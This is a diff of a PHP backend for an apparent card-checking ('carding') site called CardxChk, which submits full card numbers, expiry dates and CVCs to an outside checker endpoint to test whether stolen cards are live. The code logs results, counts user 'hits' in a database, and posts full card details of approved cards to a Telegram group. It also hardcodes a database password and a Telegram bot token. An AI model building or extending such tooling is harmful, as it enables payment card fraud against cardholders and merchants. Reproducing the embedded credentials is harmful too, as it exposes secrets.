@@ -1,5 +1,6 @@
 <?php
 require_once __DIR__ . '/globalstats.php';
+// Removed topusers.php require_once as it's causing the extra JSON output
 
 // Check if this is a GET request and show the HTML page immediately
 if ($_SERVER['REQUEST_METHOD'] === 'GET') {
@@ -137,6 +138,64 @@ if (checkProxyIP($user_ip)) {
 
 // --- END OF PROXY DETECTION LOGIC ---
 
+// === DATABASE CONNECTION ===
+ $databaseUrl = 'postgresql://card_chk_db_user:Zm2zF0tYtCDNBfaxh46MPPhC0wrB5j4R@dpg-d3l08pmr433s738hj84g-a.oregon-postgres.render.com/card_chk_db';
+
+try {
+    $dbUrl = parse_url($databaseUrl);
+    $host = $dbUrl['host'] ?? null;
+    $port = $dbUrl['port'] ?? 5432;
+    $user = $dbUrl['user'] ?? null;
+    $pass = $dbUrl['pass'] ?? null;
+    $path = $dbUrl['path'] ?? null;
+
+    if (!$host || !$user || !$pass || !$path) {
+        throw new Exception("Missing DB connection parameters");
+    }
+
+    $dbName = ltrim($path, '/');
+    
+    // Set connection timeout with extended options and SSL mode
+    $pdo = new PDO(
+        "pgsql:host=$host;port=$port;dbname=$dbName;sslmode=require",
+        $user,
+        $pass,
+        [
+            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+            PDO::ATTR_TIMEOUT => 15,
+            PDO::ATTR_PERSISTENT => false,
+            PDO::ATTR_EMULATE_PREPARES => false
+        ]
+    );
+    
+    // Store the database connection in a global variable for use in recordCardCheck
+    $GLOBALS['pdo'] = $pdo;
+    
+    // Check if user_stats table exists, create if not
+    $tableExists = $pdo->query("SELECT to_regclass('public.user_stats')")->fetchColumn();
+    if (!$tableExists) {
+        $pdo->exec("
+            CREATE TABLE user_stats (
+                id SERIAL PRIMARY KEY,
+                user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
+                hits INTEGER DEFAULT 0,
+                last_hit TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        ");
+        log_message("Created user_stats table");
+    }
+    
+} catch (PDOException $e) {
+    error_log("Database PDO Error in stripeauth.php: " . $e->getMessage());
+    echo json_encode(['status' => 'ERROR', 'message' => 'Database connection error']);
+    exit;
+} catch (Exception $e) {
+    error_log("General Error in stripeauth.php: " . $e->getMessage());
+    echo json_encode(['status' => 'ERROR', 'message' => 'Server error']);
+    exit;
+}
+
 // Start session for user authentication
 session_start([
     'cookie_secure' => isset($_SERVER['HTTPS']),
@@ -190,78 +249,125 @@ function formatResponse($response) {
 function sendTelegramNotification($card_details, $status, $response, $originalApiResponse = null) {
     global $sent_notifications;
     
-    // Create a unique key for this card to prevent duplicates
-    $notification_key = md5($card_details . $status . $response);
-    
-    // Check if we've already sent this notification
-    if (isset($sent_notifications[$notification_key])) {
-        log_message("Skipping duplicate notification for $card_details: $status");
-        return;
+    try {
+        // Create a unique key for this card to prevent duplicates
+        $notification_key = md5($card_details . $status . $response);
+        
+        // Check if we've already sent this notification
+        if (isset($sent_notifications[$notification_key])) {
+            log_message("Skipping duplicate notification for $card_details: $status");
+            return;
+        }
+        
+        // Mark this notification as sent
+        $sent_notifications[$notification_key] = true;
+        
+        // Check both formatted response and original API response for 3DS
+        $checkResponse = $originalApiResponse ? $originalApiResponse : $response;
+        if (is3DAuthenticationResponse($checkResponse)) {
+            log_message("Skipping Telegram notification for 3DS response: $checkResponse");
+            return;
+        }
+        
+        // Only proceed if status is CHARGED or APPROVED
+        if ($status !== 'CHARGED' && $status !== 'APPROVED') {
+            log_message("Skipping notification - status is not CHARGED or APPROVED: $status");
+            return;
+        }
+
+        // Load Telegram Bot Token from environment (secure storage)
+        $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
+        $chat_id = '-1003204998888'; // Your group chat ID
+        $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
+        $site_link = 'https://cxchk.site';
+
+        // Get user info from session
+        $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
+        $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
+        $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
+        $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
+        $gateway = 'Stripe Auth'; // Updated for this gateway
+        $formatted_response = formatResponse($response);
+
+        // Construct Telegram message
+        $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
+                   "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
+                   "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
+                   "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
+                   "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
+                   "<b>――――――――――――</b>\n" .
+                   "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";
+
+        // Send to Telegram
+        $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
+        $payload = [
+            'chat_id' => $chat_id,
+            'text' => $message,
+            'parse_mode' => 'HTML',
+            'disable_web_page_preview' => true
+        ];
+
+        $ch = curl_init($telegram_url);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        $result = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $curl_error = curl_error($ch);
+        curl_close($ch);
+
+        if ($http_code !== 200 || !$result) {
+            log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
+        } else {
+            log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
+        }
+    } catch (Exception $e) {
+        log_message("Error in sendTelegramNotification: " . $e->getMessage());
     }
-    
-    // Mark this notification as sent
-    $sent_notifications[$notification_key] = true;
-    
-    // Check both formatted response and original API response for 3DS
-    $checkResponse = $originalApiResponse ? $originalApiResponse : $response;
-    if (is3DAuthenticationResponse($checkResponse)) {
-        log_message("Skipping Telegram notification for 3DS response: $checkResponse");
-        return;
-    }
-    
-    // Only proceed if status is CHARGED or APPROVED
-    if ($status !== 'CHARGED' && $status !== 'APPROVED') {
-        log_message("Skipping notification - status is not CHARGED or APPROVED: $status");
-        return;
-    }
+}
 
-    // Load Telegram Bot Token from environment (secure storage)
-    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
-    $chat_id = '-1003204998888'; // Your group chat ID
-    $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
-    $site_link = 'https://cxchk.site';
+// Function to record card check in database and update user stats
+function recordCardCheck($pdo, $card_number, $status, $response) {
+    try {
+        // Get user ID from session
+        $user_id = $_SESSION['user']['id'] ?? null;
+        if (!$user_id) {
+            log_message("No user ID in session, cannot record card check");
+            return;
+        }
 
-    // Get user info from session
-    $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
-    $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
-    $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
-    $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
-    $gateway = 'Stripe Auth'; // Updated for this gateway
-    $formatted_response = formatResponse($response);
-
-    // Construct Telegram message
-    $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
-               "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
-               "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
-               "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
-               "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
-               "<b>――――――――――――</b>\n" .
-               "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";
-
-    // Send to Telegram
-    $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
-    $payload = [
-        'chat_id' => $chat_id,
-        'text' => $message,
-        'parse_mode' => 'HTML',
-        'disable_web_page_preview' => true
-    ];
-
-    $ch = curl_init($telegram_url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    $result = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    $curl_error = curl_error($ch);
-    curl_close($ch);
-
-    if ($http_code !== 200 || !$result) {
-        log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
-    } else {
-        log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
+        // Record the card check in the database
+        $stmt = $pdo->prepare("INSERT INTO card_checks (user_id, card_number, status, response, created_at) VALUES (?, ?, ?, ?, NOW())");
+        $stmt->execute([$user_id, $card_number, $status, $response]);
+        
+        // If this is a hit (APPROVED or CHARGED), update user stats
+        if ($status === 'APPROVED' || $status === 'CHARGED') {
+            try {
+                // Check if user stats record exists
+                $stmt = $pdo->prepare("SELECT id FROM user_stats WHERE user_id = ?");
+                $stmt->execute([$user_id]);
+                $statsRecord = $stmt->fetch(PDO::FETCH_ASSOC);
+                
+                if ($statsRecord) {
+                    // Update existing record
+                    $stmt = $pdo->prepare("UPDATE user_stats SET hits = hits + 1, last_hit = NOW() WHERE user_id = ?");
+                    $stmt->execute([$user_id]);
+                } else {
+                    // Create new record
+                    $stmt = $pdo->prepare("INSERT INTO user_stats (user_id, hits, last_hit) VALUES (?, 1, NOW())");
+                    $stmt->execute([$user_id]);
+                }
+                
+                log_message("Updated user stats for user ID $user_id: incrementing hits count for $status card");
+            } catch (PDOException $e) {
+                log_message("Error updating user stats: " . $e->getMessage());
+                // Continue execution even if stats update fails
+            }
+        }
+    } catch (PDOException $e) {
+        log_message("Database error in recordCardCheck: " . $e->getMessage());
     }
 }
 
@@ -273,87 +379,92 @@ if (!isset($_POST['card']) || !is_array($_POST['card'])) {
 
 // Function to check a single card via API
 function checkCard($card_number, $exp_month, $exp_year, $cvc) {
-    // Prepare card details for API and display
-    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
-    $encoded_cc = urlencode($card_details);
-    
-    // API endpoint configuration
-    $api_url = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=funkybears.net//cc=$encoded_cc";
-
-    // Initialize cURL
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $api_url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; consider enabling in production with proper SSL
-
-    // Execute request
-    $response = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    $curl_error = curl_error($ch);
-    curl_close($ch);
-
-    // Handle API errors
-    if ($response === false || $http_code !== 200 || !empty($curl_error)) {
-        log_message("API request failed: $curl_error (HTTP $http_code) for $card_details");
+    try {
+        // Prepare card details for API and display
+        $card_details = "$card_number|$exp_month|$exp_year|$cvc";
+        $encoded_cc = urlencode($card_details);
         
-        // Record the failed attempt in the database
-        recordCardCheck($GLOBALS['pdo'], $card_details, 'ERROR', "API request failed: $curl_error (HTTP $http_code)");
-        
-        // Return only status and message
-        return ['status' => 'DECLINED', 'message' => "API request failed: $curl_error (HTTP $http_code)"];
-    }
+        // API endpoint configuration
+        $api_url = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=funkybears.net//cc=$encoded_cc";
 
-    // Parse JSON response
-    $result = json_decode($response, true);
-    if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'], $result['response'])) {
-        log_message("Invalid API response: " . substr($response, 0, 100) . " for $card_details");
-        
-        // Record the failed attempt in the database
-        recordCardCheck($GLOBALS['pdo'], $card_details, 'ERROR', "Invalid API response: " . substr($response, 0, 100));
-        
-        // Return only status and message
-        return ['status' => 'DECLINED', 'message' => "Invalid API response: " . substr($response, 0, 100)];
-    }
+        // Initialize cURL
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $api_url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; consider enabling in production with proper SSL
 
-    $status = strtoupper($result['status']);
-    $response_msg = htmlspecialchars($result['response'], ENT_QUOTES, 'UTF-8'); // Sanitize response message
+        // Execute request
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $curl_error = curl_error($ch);
+        curl_close($ch);
 
-    // Check if response contains "Succeeded" (case-insensitive)
-    $is_succeeded = stripos($response_msg, 'Succeeded') !== false;
-    
-    // Determine our status based on API response
-    $our_status = 'DECLINED';
-    $our_message = $response_msg;
-    
-    if ($status === "APPROVED" || $is_succeeded) {
-        // If it's a "Succeeded" response, change the message
-        if ($is_succeeded) {
-            $our_status = 'APPROVED';
-            $our_message = 'Payment Method added successfully.';
-        } else {
-            $our_status = 'APPROVED';
+        // Handle API errors
+        if ($response === false || $http_code !== 200 || !empty($curl_error)) {
+            log_message("API request failed: $curl_error (HTTP $http_code) for $card_details");
+            
+            // Record the failed attempt in the database
+            recordCardCheck($GLOBALS['pdo'], $card_number, 'ERROR', "API request failed: $curl_error (HTTP $http_code)");
+            
+            // Return only status and message
+            return ['status' => 'DECLINED', 'message' => "API request failed: $curl_error (HTTP $http_code)"];
         }
-    } elseif ($status === "DECLINED") {
+
+        // Parse JSON response
+        $result = json_decode($response, true);
+        if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'], $result['response'])) {
+            log_message("Invalid API response: " . substr($response, 0, 100) . " for $card_details");
+            
+            // Record the failed attempt in the database
+            recordCardCheck($GLOBALS['pdo'], $card_number, 'ERROR', "Invalid API response: " . substr($response, 0, 100));
+            
+            // Return only status and message
+            return ['status' => 'DECLINED', 'message' => "Invalid API response: " . substr($response, 0, 100)];
+        }
+
+        $status = strtoupper($result['status']);
+        $response_msg = htmlspecialchars($result['response'], ENT_QUOTES, 'UTF-8'); // Sanitize response message
+
+        // Check if response contains "Succeeded" (case-insensitive)
+        $is_succeeded = stripos($response_msg, 'Succeeded') !== false;
+        
+        // Determine our status based on API response
         $our_status = 'DECLINED';
-    } else {
-        $our_status = 'DECLINED';
-        $our_message = "Unknown status: $status";
+        $our_message = $response_msg;
+        
+        if ($status === "APPROVED" || $is_succeeded) {
+            // If it's a "Succeeded" response, change the message
+            if ($is_succeeded) {
+                $our_status = 'APPROVED';
+                $our_message = 'Payment Method added successfully.';
+            } else {
+                $our_status = 'APPROVED';
+            }
+        } elseif ($status === "DECLINED") {
+            $our_status = 'DECLINED';
+        } else {
+            $our_status = 'DECLINED';
+            $our_message = "Unknown status: $status";
+        }
+        
+        log_message("$our_status for $card_details: $our_message");
+        
+        // Record the card check result in the database
+        recordCardCheck($GLOBALS['pdo'], $card_number, $our_status, $our_message);
+        
+        // Send Telegram notification for APPROVED status
+        if ($our_status === 'APPROVED') {
+            sendTelegramNotification($card_details, $our_status, $our_message, $response);
+        }
+        
+        // Return only status and message
+        return ['status' => $our_status, 'message' => $our_message];
+    } catch (Exception $e) {
+        log_message("Exception in checkCard: " . $e->getMessage());
+        return ['status' => 'ERROR', 'message' => 'An error occurred while checking the card'];
     }
-    
-    log_message("$our_status for $card_details: $our_message");
-    
-    // Record the card check result in the database
-    recordCardCheck($GLOBALS['pdo'], $card_details, $our_status, $our_message);
-    
-    // Send Telegram notification for APPROVED status
-    if ($our_status === 'APPROVED') {
-        sendTelegramNotification($card_details, $our_status, $our_message, $response);
-    }
-    
-    // Return only status and message
-    return ['status' => $our_status, 'message' => $our_message];
 }
 
 // Check if the request is POST and contains card data
@@ -430,6 +541,11 @@ if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
 }
 
 // Check single card and output JSON response
- $result = checkCard($card_number, $exp_month, $exp_year, $cvc);
-echo json_encode($result);
+try {
+    $result = checkCard($card_number, $exp_month, $exp_year, $cvc);
+    echo json_encode($result);
+} catch (Exception $e) {
+    log_message("Final exception: " . $e->getMessage());
+    echo json_encode(['status' => 'ERROR', 'message' => 'An error occurred while processing your request']);
+}
 ?>
